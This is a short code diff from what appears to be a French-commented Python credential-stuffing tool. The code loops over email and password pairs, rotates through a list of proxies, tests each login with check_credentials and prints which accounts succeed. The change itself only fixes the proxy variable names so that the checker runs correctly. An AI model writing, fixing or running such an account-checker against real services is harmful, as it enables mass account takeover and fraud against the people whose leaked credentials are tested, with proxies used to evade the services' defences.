@@ -140,12 +140,13 @@ def run_script(file_path):
             for i, combo in enumerate(combos):
                 email = combo["email"]
                 password = combo["password"]
-                proxy_used = proxies[i % len(proxies)]  # Utilisez un proxy de la liste
+                proxy_used = PROXIES[i % len(PROXIES)]  # Utilisez un proxy de la liste
 
-                result = f"Test de connexion pour {email}:{password} via proxy {proxy}..."
+
+                result = f"Test de connexion pour {email}:{password} via proxy {proxy_used}..."
                 print(result)
 
-                if check_credentials(email, password, proxy):
+                if check_credentials(email, password, proxy_used):
                     print(f"{Fore.GREEN}[SUCCESS] Connexion réussie pour: {email}:{password}\n{Style.RESET_ALL}")
                 else:
                     print(f"{Fore.RED}[FAIL] La connexion a échoué pour: {email}:{password}\n{Style.RESET_ALL}")
@@ -186,3 +187,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+
